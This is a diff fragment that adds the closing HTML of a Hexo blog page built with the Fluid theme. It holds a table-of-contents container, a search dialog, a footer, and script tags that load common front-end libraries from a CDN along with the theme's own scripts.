+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
